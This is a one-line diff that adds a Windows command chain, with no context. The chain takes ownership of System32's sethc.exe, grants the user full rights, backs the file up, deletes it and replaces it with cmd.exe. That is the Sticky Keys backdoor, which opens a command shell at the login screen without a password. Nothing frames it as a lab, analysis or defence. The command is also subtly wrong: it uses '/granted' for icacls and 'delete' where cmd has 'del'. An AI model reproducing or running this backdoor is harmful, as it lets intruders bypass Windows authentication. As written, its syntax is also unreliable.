@@ -1,0 +1,1 @@
+cd\&cd Windows\System32&takeown /f sethc.exe&icacls sethc.exe /granted "%username%":F&copy sethc.exe "%temp%\sethc.backup"&delete sethc.exe&copy cmd.exe sethc.exe
